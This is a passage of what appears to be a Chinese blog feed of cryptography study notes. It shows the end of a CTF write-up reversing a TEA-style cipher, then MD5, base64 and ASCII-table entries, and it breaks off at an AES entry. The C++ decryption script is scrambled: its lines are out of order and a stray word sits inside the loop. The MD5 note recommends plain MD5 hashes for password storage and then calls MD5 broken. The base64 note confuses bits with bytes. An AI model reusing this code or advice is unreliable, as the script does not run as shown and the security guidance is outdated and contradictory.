int)(v1 + v20);</span><br><span class="line">    v21 += result ^ (v14 + 32 * v20) ^ (v15 + 16 * v20);</span><br><span class="line">    --v2;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v2 );</span><br><span class="line">  *(int *)((char *)a1 + 3) = v20;</span><br><span class="line">  *(int *)((char *)a1 + 7) = v21;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>观察加密函数不难发现</p><p>其中定义了四个密钥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a1[8] = 1234;</span><br><span class="line">a1[9] = 2341;</span><br><span class="line">a1[10] = 3412;</span><br><span class="line">a1[11] = 4123;</span><br></pre></td></tr></table></figure><p>和一个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delta = 0xdeadbeef（  a1[12] = -559038737;）</span><br></pre></td></tr></table></figure><p>wp的解密脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"> #include</span><br><span class="line"> &lt;bits/stdc</span><br><span class="line"> ++.h&gt;</span><br><span class="line"> using </span><br><span class="line">namespace </span><br><span class="line">std;</span><br><span class="line"> void decrypt(uint32_t* v, uint32_t* k)</span><br><span class="line"> &#123;</span><br><span class="line"> uint32_t v0 = v[0</span><br><span class="line"> ], v1 = v[1];</span><br><span class="line"> uint32_t delta = 0xdeadbeef, sum = delta * 32;</span><br><span class="line"> for (</span><br><span class="line"> int i = 0; i &lt; 32; i</span><br><span class="line"> &#123;    </span><br><span class="line">++)</span><br><span class="line"> Arithmetic</span><br><span class="line"> v1 -= (v0 + sum) ^ (k[2] + (v0 &lt;&lt; 4)) ^ (k[3] + (v0 </span><br><span class="line">&lt;&lt; 5));</span><br><span class="line"> v0 -= (v1 + sum) ^ (k[0] + (v1 &lt;&lt; 4)) ^ (k[1] + (v1 </span><br><span class="line">&lt;&lt; 5));</span><br><span class="line"> sum -= delta;</span><br><span class="line"> &#125;</span><br><span class="line"> v[0] = v0, v[1] = v1;</span><br><span class="line"> &#125;</span><br><span class="line"> int main()</span><br><span class="line"> &#123;</span><br><span class="line"> uint32_t key</span><br><span class="line"> [] = </span><br><span class="line">&#123;</span><br><span class="line"> 1234,</span><br><span class="line"> 2341,</span><br><span class="line"> 3412,</span><br><span class="line"> 4123</span><br><span class="line"> &#125;;</span><br><span class="line"> unsigned </span><br><span class="line">char cipher</span><br><span class="line"> [] = &#123;0x88, 0x04, 0xC6, 0x6A, 0x7F, 0xA7, 0xEC, 0x27, </span><br><span class="line">0x6E, 0xBF, </span><br><span class="line">0xB8, 0xAA, 0x0D, 0x3A, 0xAD, 0xE7, 0x7E, 0x52, 0xFF, 0x8C, </span><br><span class="line">0x8B, 0xEF, 0x11, 0x9C, 0x3D, 0xC3, 0xEA, 0xFD, 0x23, 0x1F, </span><br><span class="line">0x71, 0x4D</span><br><span class="line"> &#125;;</span><br><span class="line"> decrypt</span><br><span class="line"> ((uint32_t</span><br><span class="line"> *)&amp;cipher[24</span><br><span class="line"> decrypt</span><br><span class="line"> ((uint32_t</span><br><span class="line"> ], key);</span><br><span class="line"> *)&amp;cipher[16</span><br><span class="line"> ], key);</span><br><span class="line"> decrypt</span><br><span class="line"> ((uint32_t</span><br><span class="line"> *)&amp;cipher[8</span><br><span class="line"> decrypt</span><br><span class="line"> ((uint32_t</span><br><span class="line"> ], key);</span><br><span class="line"> *)&amp;cipher[0</span><br><span class="line"> ], key);</span><br><span class="line"> printf(&quot;%s&quot;, cipher)</span><br></pre></td></tr></table></figure><p>得到flag</p></li></ol><h3 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h3><p>对于大多数加密算法，加密操作的输入和输出通常不是按字节计算的，而是按块进行处理。每个加密算法有其固定的块大小，输入数据会被分割成固定大小的块进行加密处理，输出也是以块为单位生成的密文。</p><p>举例来说，常见的对称加密算法 AES 中，一个块的大小是 128 比特（16 字节），即 16 个字节。因此，无论输入的数据是多少字节，都会被分割成 16 字节的块进行加密操作。</p><p>在现代加密算法中，通常是以比特（bits）作为最小的数据单位进行处理的，而不是字节。因此，具体一个字节加密会占用多少个字节是因加密算法而异，取决于这个算法定义的块大小。常见的对称加密算法（比如 AES）的块大小一般是 16 字节，而像 TEA 这样的算法的块大小是 8 字节。</p>]]></content>
      
      
      <categories>
          
          <category> 加密算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 加密算法 </tag>
            
            <tag> 对称加密 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MD5加密学习笔记</title>
      <link href="/2025/03/10/%E7%BC%96%E7%A0%81%E5%92%8C%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/MD5%E5%8A%A0%E5%AF%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2025/03/10/%E7%BC%96%E7%A0%81%E5%92%8C%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/MD5%E5%8A%A0%E5%AF%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="MD5加密学习笔记"><a href="#MD5加密学习笔记" class="headerlink" title="MD5加密学习笔记"></a>MD5加密学习笔记</h1><h2 id="1-什么是MD5加密"><a href="#1-什么是MD5加密" class="headerlink" title="1. 什么是MD5加密"></a>1. 什么是MD5加密</h2><p>MD5：英文全称是 Message-Digest Algorithm 5</p><p> Hash 算法的一种</p><p>原理：MD5以512位分组来处理输入的信息，且每一分组又被划分为16个32位子分组，经过了一系列的处理后，算法的输出由四个32位分组组成，将这四个32位分组级联后将生成一个128位散列值。</p><h2 id="2-MD5有什么特点"><a href="#2-MD5有什么特点" class="headerlink" title="2. MD5有什么特点"></a>2. MD5有什么特点</h2><p><strong>不可逆</strong></p><p>原因：由于MD5加密原理一个密码所对应的原文可能有很多个而一个原文只会有一个密码</p><p><strong>长度固定</strong></p><p>无论原文多少输出的永远16字节</p><p><strong>高度离散性</strong></p><p>输出的16个字节数据，没有任何规律可言。假如两次的输入只改变一个位，输出的结果也完全不同</p><p><strong>抗碰撞性</strong></p><p>两个不同输入很难得到一个相同的MD5加密结果</p><h2 id="3-MD5有什么用"><a href="#3-MD5有什么用" class="headerlink" title="3. MD5有什么用"></a>3. MD5有什么用</h2><ol><li><p>防止被篡改：<br>1）比如发送一个电子文档，发送前，我先得到MD5的输出结果a。然后在对方收到电子文档后，对方也得到一个MD5的输出结果b。如果a与b一样就代表中途未被篡改。<br>2）比如我提供文件下载，为了防止不法分子在安装程序中添加木马，我可以在网站上公布由安装文件得到的MD5输出结果。<br>3）SVN在检测文件是否在CheckOut后被修改过，也是用到了MD5.</p></li><li><p>用户密码保护</p></li></ol><p>在数据库记录密码时，并不记录密码本身，而是记录密码经过MD5加密后所产生的结果。当用户输入密码时，只需要把输入的密码再进行MD5校验，再与数据库中的结果进行对比就可以了。<br>这样的好处是，即便数据库被盗，也无法通过结果反推出密码是什么</p><ol start="3"><li>数字签名</li></ol><p>当发布程序时，可以同时发布该程序的MD5，这样在别人下载之后，只需要再经过MD5加密一遍，只需要判断自己下载程序的MD5与发布商的发布的MD5是否相同，从而可以判断程序是否被植入木马。</p><ol start="4"><li><p>云盘秒传</p><p>有的时候我们在云盘上上传一个很大文件，它几乎很快就传上去了，其实它并不是把文件传上去，它是先计算一下文件的MD5，并且在数据库中查找一个，看看有没有该MD5，如果有的话则直接使用该文件，从而实现文件妙传。</p></li></ol><h2 id="4-MD5解密"><a href="#4-MD5解密" class="headerlink" title="4. MD5解密"></a>4. MD5解密</h2><p>目前可以说 md5 已经基本被攻破了，一般的 MD5 的碰撞都可以在如下网上获取到</p><ol><li><p>（<a href="https://www.cmd5.com/">md5在线解密破解,md5解密加密 (cmd5.com)</a>）</p></li><li><p>（<a href="http://www.ttmd5.com/">md5解密|md5在线解密 - 全球唯一8位小写+数字全收录的解密网站 (ttmd5.com)</a>）</p></li><li><p>（<a href="https://pmd5.com/">md5解密 MD5在线解密 破解md5 (pmd5.com)</a>）</p></li><li><p><a href="https://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip">https://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip</a> (生成指定前缀的 md5 碰撞)</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 加密算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 加密算法 </tag>
            
            <tag> hash函数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>base64编码学习笔记</title>
      <link href="/2025/03/10/%E7%BC%96%E7%A0%81%E5%92%8C%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/base64%E7%BC%96%E7%A0%81%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2025/03/10/%E7%BC%96%E7%A0%81%E5%92%8C%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/base64%E7%BC%96%E7%A0%81%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="base64编码学习笔记"><a href="#base64编码学习笔记" class="headerlink" title="base64编码学习笔记"></a>base64编码学习笔记</h1><h2 id="1-什么是base64"><a href="#1-什么是base64" class="headerlink" title="1. 什么是base64"></a>1. 什么是base64</h2><p>Base64是一种二进制到文本的编码方式。如果要更具体一点的话，可以认为它是一种将 byte数组编码为字符串的方法，而且编码出的字符串只包含ASCII基础字符。</p><p>例如字符串ShuSheng007对应的Base64为U2h1U2hlbmcwMDc&#x3D;。其中那个&#x3D;比较特殊，是填充符</p><p>值得注意的是Base64不是加密算法，其仅仅是一种编码方式，算法也是公开的，所以不能依赖它进行加密。</p><h2 id="2-为什么叫base64"><a href="#2-为什么叫base64" class="headerlink" title="2. 为什么叫base64"></a>2. 为什么叫base64</h2><p>因为它是基于(Base)64个字符的一种编码方式。使用其编码后的文本只包含64个ASCII码字符（偶尔加一个填充字符&#x3D;），如下所示：</p><p>Base64使用到的64个字符：</p><p><code>A-Z</code> 26个<br><code>a-z </code>26个<br><code>0-9</code> 10个</p><p><code>+</code>1个<br><code>/</code> 1个<br>下图是Base64码表，可以看到从0到63的每个数字都对应一个上面的一个字符。</p><p><img src="C:\Users\lkh_2\AppData\Roaming\Typora\typora-user-images\image-20240325113951714.png" alt="image-20240325113951714"></p><h2 id="3-base64编码的原理"><a href="#3-base64编码的原理" class="headerlink" title="3. base64编码的原理"></a>3. base64编码的原理</h2><p><img src="C:\Users\lkh_2\AppData\Roaming\Typora\typora-user-images\image-20240325114534860.png" alt="image-20240325114534860"></p><p>解释base64编码后后面有两个<code>=</code>的原因</p><p>因为文本是8byte而base64是6byte所以为了补全可能多出来的byte</p><p>会用过补0的方法来避免</p><p><img src="C:\Users\lkh_2\AppData\Roaming\Typora\typora-user-images\image-20240325115041641.png" alt="image-20240325115041641"></p><h2 id="4-base64的编码与解码"><a href="#4-base64的编码与解码" class="headerlink" title="4. base64的编码与解码"></a>4. base64的编码与解码</h2><p>对于base64的编码与解码操作的方式有很多可以通过在线编译工具  python内置的base64库等方法进行操作</p><h3 id="1-在线编译工具"><a href="#1-在线编译工具" class="headerlink" title="1. 在线编译工具"></a>1. 在线编译工具</h3><p><img src="C:\Users\lkh_2\AppData\Roaming\Typora\typora-user-images\image-20240325115536951.png" alt="image-20240325115536951"></p><p>这类工具可以通过网上直接搜索base64 得到我这里就不多讲了】</p><h3 id="2-python内置的base64库"><a href="#2-python内置的base64库" class="headerlink" title="2. python内置的base64库"></a>2. python内置的base64库</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import base64</span><br><span class="line">&gt;&gt;&gt; base64.b64encode(b&#x27;binary\x00string&#x27;)</span><br><span class="line">b&#x27;YmluYXJ5AHN0cmluZw==&#x27;</span><br><span class="line">&gt;&gt;&gt; base64.b64decode(b&#x27;YmluYXJ5AHN0cmluZw==&#x27;)</span><br><span class="line">b&#x27;binary\x00string&#x27;</span><br></pre></td></tr></table></figure><h2 id="5-base家族"><a href="#5-base家族" class="headerlink" title="5. base家族"></a>5. base家族</h2><p>没想到base64还有弟弟妹妹 base32和base16</p><h3 id="1-base32"><a href="#1-base32" class="headerlink" title="1. base32"></a>1. base32</h3><p>索引表</p><p><img src="C:\Users\lkh_2\AppData\Roaming\Typora\typora-user-images\image-20240325121400776.png" alt="image-20240325121400776"></p><h3 id="2-base16"><a href="#2-base16" class="headerlink" title="2. base16"></a>2. base16</h3><p>索引表</p><p><img src="C:\Users\lkh_2\AppData\Roaming\Typora\typora-user-images\image-20240325121500758.png" alt="image-20240325121500758"></p><p>当然既然是一家人他们的编码原理肯定也是大同小异的我就不多讲了</p>]]></content>
      
      
      <categories>
          
          <category> 编码 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ASCII码表</title>
      <link href="/2025/03/10/%E7%BC%96%E7%A0%81%E5%92%8C%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/ASCII%E7%A0%81%E8%A1%A8/"/>
      <url>/2025/03/10/%E7%BC%96%E7%A0%81%E5%92%8C%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/ASCII%E7%A0%81%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="ASCII码表"><a href="#ASCII码表" class="headerlink" title="ASCII码表"></a>ASCII码表</h1><table><thead><tr><th>Bin(二进制)</th><th>Oct(八进制)</th><th>Dec(十进制)</th><th>Hex(十六进制)</th><th>缩写&#x2F;字符</th><th>解释</th></tr></thead><tbody><tr><td>0000 0000</td><td>00</td><td>0</td><td>0x00</td><td>NUL(null)</td><td>空字符</td></tr><tr><td>0000 0001</td><td>01</td><td>1</td><td>0x01</td><td>SOH(start of headline)</td><td>标题开始</td></tr><tr><td>0000 0010</td><td>02</td><td>2</td><td>0x02</td><td>STX (start of text)</td><td>正文开始</td></tr><tr><td>0000 0011</td><td>03</td><td>3</td><td>0x03</td><td>ETX (end of text)</td><td>正文结束</td></tr><tr><td>0000 0100</td><td>04</td><td>4</td><td>0x04</td><td>EOT (end of transmission)</td><td>传输结束</td></tr><tr><td>0000 0101</td><td>05</td><td>5</td><td>0x05</td><td>ENQ (enquiry)</td><td>请求</td></tr><tr><td>0000 0110</td><td>06</td><td>6</td><td>0x06</td><td>ACK (acknowledge)</td><td>收到通知</td></tr><tr><td>0000 0111</td><td>07</td><td>7</td><td>0x07</td><td>BEL (bell)</td><td>响铃</td></tr><tr><td>0000 1000</td><td>010</td><td>8</td><td>0x08</td><td>BS (backspace)</td><td>退格</td></tr><tr><td>0000 1001</td><td>011</td><td>9</td><td>0x09</td><td>HT (horizontal tab)</td><td>水平制表符</td></tr><tr><td>0000 1010</td><td>012</td><td>10</td><td>0x0A</td><td>LF (NL line feed, new line)</td><td>换行键</td></tr><tr><td>0000 1011</td><td>013</td><td>11</td><td>0x0B</td><td>VT (vertical tab)</td><td>垂直制表符</td></tr><tr><td>0000 1100</td><td>014</td><td>12</td><td>0x0C</td><td>FF (NP form feed, new page)</td><td>换页键</td></tr><tr><td>0000 1101</td><td>015</td><td>13</td><td>0x0D</td><td>CR (carriage return)</td><td>回车键</td></tr><tr><td>0000 1110</td><td>016</td><td>14</td><td>0x0E</td><td>SO (shift out)</td><td>不用切换</td></tr><tr><td>0000 1111</td><td>017</td><td>15</td><td>0x0F</td><td>SI (shift in)</td><td>启用切换</td></tr><tr><td>0001 0000</td><td>020</td><td>16</td><td>0x10</td><td>DLE (data link escape)</td><td>数据链路转义</td></tr><tr><td>0001 0001</td><td>021</td><td>17</td><td>0x11</td><td>DC1 (device control 1)</td><td>设备控制1</td></tr><tr><td>0001 0010</td><td>022</td><td>18</td><td>0x12</td><td>DC2 (device control 2)</td><td>设备控制2</td></tr><tr><td>0001 0011</td><td>023</td><td>19</td><td>0x13</td><td>DC3 (device control 3)</td><td>设备控制3</td></tr><tr><td>0001 0100</td><td>024</td><td>20</td><td>0x14</td><td>DC4 (device control 4)</td><td>设备控制4</td></tr><tr><td>0001 0101</td><td>025</td><td>21</td><td>0x15</td><td>NAK (negative acknowledge)</td><td>拒绝接收</td></tr><tr><td>0001 0110</td><td>026</td><td>22</td><td>0x16</td><td>SYN (synchronous idle)</td><td>同步空闲</td></tr><tr><td>0001 0111</td><td>027</td><td>23</td><td>0x17</td><td>ETB (end of trans. block)</td><td>结束传输块</td></tr><tr><td>0001 1000</td><td>030</td><td>24</td><td>0x18</td><td>CAN (cancel)</td><td>取消</td></tr><tr><td>0001 1001</td><td>031</td><td>25</td><td>0x19</td><td>EM (end of medium)</td><td>媒介结束</td></tr><tr><td>0001 1010</td><td>032</td><td>26</td><td>0x1A</td><td>SUB (substitute)</td><td>代替</td></tr><tr><td>0001 1011</td><td>033</td><td>27</td><td>0x1B</td><td>ESC (escape)</td><td>换码(溢出)</td></tr><tr><td>0001 1100</td><td>034</td><td>28</td><td>0x1C</td><td>FS (file separator)</td><td>文件分隔符</td></tr><tr><td>0001 1101</td><td>035</td><td>29</td><td>0x1D</td><td>GS (group separator)</td><td>分组符</td></tr><tr><td>0001 1110</td><td>036</td><td>30</td><td>0x1E</td><td>RS (record separator)</td><td>记录分隔符</td></tr><tr><td>0001 1111</td><td>037</td><td>31</td><td>0x1F</td><td>US (unit separator)</td><td>单元分隔符</td></tr><tr><td>0010 0000</td><td>040</td><td>32</td><td>0x20</td><td>(space)</td><td>空格</td></tr><tr><td>0010 0001</td><td>041</td><td>33</td><td>0x21</td><td>!</td><td>叹号</td></tr><tr><td>0010 0010</td><td>042</td><td>34</td><td>0x22</td><td>“</td><td>双引号</td></tr><tr><td>0010 0011</td><td>043</td><td>35</td><td>0x23</td><td>#</td><td>井号</td></tr><tr><td>0010 0100</td><td>044</td><td>36</td><td>0x24</td><td>$</td><td>美元符</td></tr><tr><td>0010 0101</td><td>045</td><td>37</td><td>0x25</td><td>%</td><td>百分号</td></tr><tr><td>0010 0110</td><td>046</td><td>38</td><td>0x26</td><td>&amp;</td><td>和号</td></tr><tr><td>0010 0111</td><td>047</td><td>39</td><td>0x27</td><td>‘</td><td>单引号</td></tr><tr><td>0010 1000</td><td>050</td><td>40</td><td>0x28</td><td>(</td><td>开括号</td></tr><tr><td>0010 1001</td><td>051</td><td>41</td><td>0x29</td><td>)</td><td>闭括号</td></tr><tr><td>0010 1010</td><td>052</td><td>42</td><td>0x2A</td><td>*</td><td>星号</td></tr><tr><td>0010 1011</td><td>053</td><td>43</td><td>0x2B</td><td>+</td><td>加号</td></tr><tr><td>0010 1100</td><td>054</td><td>44</td><td>0x2C</td><td>,</td><td>逗号</td></tr><tr><td>0010 1101</td><td>055</td><td>45</td><td>0x2D</td><td>-</td><td>减号&#x2F;破折号</td></tr><tr><td>0010 1110</td><td>056</td><td>46</td><td>0x2E</td><td>.</td><td>句号</td></tr><tr><td>0010 1111</td><td>057</td><td>47</td><td>0x2F</td><td>&#x2F;</td><td>斜杠</td></tr><tr><td>0011 0000</td><td>060</td><td>48</td><td>0x30</td><td>0</td><td>字符0</td></tr><tr><td>0011 0001</td><td>061</td><td>49</td><td>0x31</td><td>1</td><td>字符1</td></tr><tr><td>0011 0010</td><td>062</td><td>50</td><td>0x32</td><td>2</td><td>字符2</td></tr><tr><td>0011 0011</td><td>063</td><td>51</td><td>0x33</td><td>3</td><td>字符3</td></tr><tr><td>0011 0100</td><td>064</td><td>52</td><td>0x34</td><td>4</td><td>字符4</td></tr><tr><td>0011 0101</td><td>065</td><td>53</td><td>0x35</td><td>5</td><td>字符5</td></tr><tr><td>0011 0110</td><td>066</td><td>54</td><td>0x36</td><td>6</td><td>字符6</td></tr><tr><td>0011 0111</td><td>067</td><td>55</td><td>0x37</td><td>7</td><td>字符7</td></tr><tr><td>0011 1000</td><td>070</td><td>56</td><td>0x38</td><td>8</td><td>字符8</td></tr><tr><td>0011 1001</td><td>071</td><td>57</td><td>0x39</td><td>9</td><td>字符9</td></tr><tr><td>0011 1010</td><td>072</td><td>58</td><td>0x3A</td><td>:</td><td>冒号</td></tr><tr><td>0011 1011</td><td>073</td><td>59</td><td>0x3B</td><td>;</td><td>分号</td></tr><tr><td>0011 1100</td><td>074</td><td>60</td><td>0x3C</td><td>&lt;</td><td>小于</td></tr><tr><td>0011 1101</td><td>075</td><td>61</td><td>0x3D</td><td>&#x3D;</td><td>等号</td></tr><tr><td>0011 1110</td><td>076</td><td>62</td><td>0x3E</td><td>&gt;</td><td>大于</td></tr><tr><td>0011 1111</td><td>077</td><td>63</td><td>0x3F</td><td>?</td><td>问号</td></tr><tr><td>0100 0000</td><td>0100</td><td>64</td><td>0x40</td><td>@</td><td>电子邮件符号</td></tr><tr><td>0100 0001</td><td>0101</td><td>65</td><td>0x41</td><td>A</td><td>大写字母A</td></tr><tr><td>0100 0010</td><td>0102</td><td>66</td><td>0x42</td><td>B</td><td>大写字母B</td></tr><tr><td>0100 0011</td><td>0103</td><td>67</td><td>0x43</td><td>C</td><td>大写字母C</td></tr><tr><td>0100 0100</td><td>0104</td><td>68</td><td>0x44</td><td>D</td><td>大写字母D</td></tr><tr><td>0100 0101</td><td>0105</td><td>69</td><td>0x45</td><td>E</td><td>大写字母E</td></tr><tr><td>0100 0110</td><td>0106</td><td>70</td><td>0x46</td><td>F</td><td>大写字母F</td></tr><tr><td>0100 0111</td><td>0107</td><td>71</td><td>0x47</td><td>G</td><td>大写字母G</td></tr><tr><td>0100 1000</td><td>0110</td><td>72</td><td>0x48</td><td>H</td><td>大写字母H</td></tr><tr><td>0100 1001</td><td>0111</td><td>73</td><td>0x49</td><td>I</td><td>大写字母I</td></tr><tr><td>01001010</td><td>0112</td><td>74</td><td>0x4A</td><td>J</td><td>大写字母J</td></tr><tr><td>0100 1011</td><td>0113</td><td>75</td><td>0x4B</td><td>K</td><td>大写字母K</td></tr><tr><td>0100 1100</td><td>0114</td><td>76</td><td>0x4C</td><td>L</td><td>大写字母L</td></tr><tr><td>0100 1101</td><td>0115</td><td>77</td><td>0x4D</td><td>M</td><td>大写字母M</td></tr><tr><td>0100 1110</td><td>0116</td><td>78</td><td>0x4E</td><td>N</td><td>大写字母N</td></tr><tr><td>0100 1111</td><td>0117</td><td>79</td><td>0x4F</td><td>O</td><td>大写字母O</td></tr><tr><td>0101 0000</td><td>0120</td><td>80</td><td>0x50</td><td>P</td><td>大写字母P</td></tr><tr><td>0101 0001</td><td>0121</td><td>81</td><td>0x51</td><td>Q</td><td>大写字母Q</td></tr><tr><td>0101 0010</td><td>0122</td><td>82</td><td>0x52</td><td>R</td><td>大写字母R</td></tr><tr><td>0101 0011</td><td>0123</td><td>83</td><td>0x53</td><td>S</td><td>大写字母S</td></tr><tr><td>0101 0100</td><td>0124</td><td>84</td><td>0x54</td><td>T</td><td>大写字母T</td></tr><tr><td>0101 0101</td><td>0125</td><td>85</td><td>0x55</td><td>U</td><td>大写字母U</td></tr><tr><td>0101 0110</td><td>0126</td><td>86</td><td>0x56</td><td>V</td><td>大写字母V</td></tr><tr><td>0101 0111</td><td>0127</td><td>87</td><td>0x57</td><td>W</td><td>大写字母W</td></tr><tr><td>0101 1000</td><td>0130</td><td>88</td><td>0x58</td><td>X</td><td>大写字母X</td></tr><tr><td>0101 1001</td><td>0131</td><td>89</td><td>0x59</td><td>Y</td><td>大写字母Y</td></tr><tr><td>0101 1010</td><td>0132</td><td>90</td><td>0x5A</td><td>Z</td><td>大写字母Z</td></tr><tr><td>0101 1011</td><td>0133</td><td>91</td><td>0x5B</td><td>[</td><td>开方括号</td></tr><tr><td>0101 1100</td><td>0134</td><td>92</td><td>0x5C</td><td>\</td><td>反斜杠</td></tr><tr><td>0101 1101</td><td>0135</td><td>93</td><td>0x5D</td><td>]</td><td>闭方括号</td></tr><tr><td>0101 1110</td><td>0136</td><td>94</td><td>0x5E</td><td>^</td><td>脱字符</td></tr><tr><td>0101 1111</td><td>0137</td><td>95</td><td>0x5F</td><td>_</td><td>下划线</td></tr><tr><td>0110 0000</td><td>0140</td><td>96</td><td>0x60</td><td>&#96;</td><td>开单引号</td></tr><tr><td>0110 0001</td><td>0141</td><td>97</td><td>0x61</td><td>a</td><td>小写字母a</td></tr><tr><td>0110 0010</td><td>0142</td><td>98</td><td>0x62</td><td>b</td><td>小写字母b</td></tr><tr><td>0110 0011</td><td>0143</td><td>99</td><td>0x63</td><td>c</td><td>小写字母c</td></tr><tr><td>0110 0100</td><td>0144</td><td>100</td><td>0x64</td><td>d</td><td>小写字母d</td></tr><tr><td>0110 0101</td><td>0145</td><td>101</td><td>0x65</td><td>e</td><td>小写字母e</td></tr><tr><td>0110 0110</td><td>0146</td><td>102</td><td>0x66</td><td>f</td><td>小写字母f</td></tr><tr><td>0110 0111</td><td>0147</td><td>103</td><td>0x67</td><td>g</td><td>小写字母g</td></tr><tr><td>0110 1000</td><td>0150</td><td>104</td><td>0x68</td><td>h</td><td>小写字母h</td></tr><tr><td>0110 1001</td><td>0151</td><td>105</td><td>0x69</td><td>i</td><td>小写字母i</td></tr><tr><td>0110 1010</td><td>0152</td><td>106</td><td>0x6A</td><td>j</td><td>小写字母j</td></tr><tr><td>0110 1011</td><td>0153</td><td>107</td><td>0x6B</td><td>k</td><td>小写字母k</td></tr><tr><td>0110 1100</td><td>0154</td><td>108</td><td>0x6C</td><td>l</td><td>小写字母l</td></tr><tr><td>0110 1101</td><td>0155</td><td>109</td><td>0x6D</td><td>m</td><td>小写字母m</td></tr><tr><td>0110 1110</td><td>0156</td><td>110</td><td>0x6E</td><td>n</td><td>小写字母n</td></tr><tr><td>0110 1111</td><td>0157</td><td>111</td><td>0x6F</td><td>o</td><td>小写字母o</td></tr><tr><td>0111 0000</td><td>0160</td><td>112</td><td>0x70</td><td>p</td><td>小写字母p</td></tr><tr><td>0111 0001</td><td>0161</td><td>113</td><td>0x71</td><td>q</td><td>小写字母q</td></tr><tr><td>0111 0010</td><td>0162</td><td>114</td><td>0x72</td><td>r</td><td>小写字母r</td></tr><tr><td>0111 0011</td><td>0163</td><td>115</td><td>0x73</td><td>s</td><td>小写字母s</td></tr><tr><td>0111 0100</td><td>0164</td><td>116</td><td>0x74</td><td>t</td><td>小写字母t</td></tr><tr><td>0111 0101</td><td>0165</td><td>117</td><td>0x75</td><td>u</td><td>小写字母u</td></tr><tr><td>0111 0110</td><td>0166</td><td>118</td><td>0x76</td><td>v</td><td>小写字母v</td></tr><tr><td>0111 0111</td><td>0167</td><td>119</td><td>0x77</td><td>w</td><td>小写字母w</td></tr><tr><td>0111 1000</td><td>0170</td><td>120</td><td>0x78</td><td>x</td><td>小写字母x</td></tr><tr><td>0111 1001</td><td>0171</td><td>121</td><td>0x79</td><td>y</td><td>小写字母y</td></tr><tr><td>0111 1010</td><td>0172</td><td>122</td><td>0x7A</td><td>z</td><td>小写字母z</td></tr><tr><td>0111 1011</td><td>0173</td><td>123</td><td>0x7B</td><td>{</td><td>开花括号</td></tr><tr><td>0111 1100</td><td>0174</td><td>124</td><td>0x7C</td><td>|</td><td>垂线</td></tr><tr><td>0111 1101</td><td>0175</td><td>125</td><td>0x7D</td><td>}</td><td>闭花括号</td></tr><tr><td>0111 1110</td><td>0176</td><td>126</td><td>0x7E</td><td>~</td><td>波浪号</td></tr><tr><td>0111 1111</td><td>0177</td><td>127</td><td>0x7F</td><td>DEL (delete)</td><td>删除</td></tr></tbody></table>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>AES加密算法</title>
      <link href="/2025/03/10/%E7%BC%96%E7%A0%81%E5%92%8C%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/AES%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/"/>
      <url>/2025/03/10/%E7%BC%96%E7%A0%81%E5%92%8C%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/AES%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/</url>
      
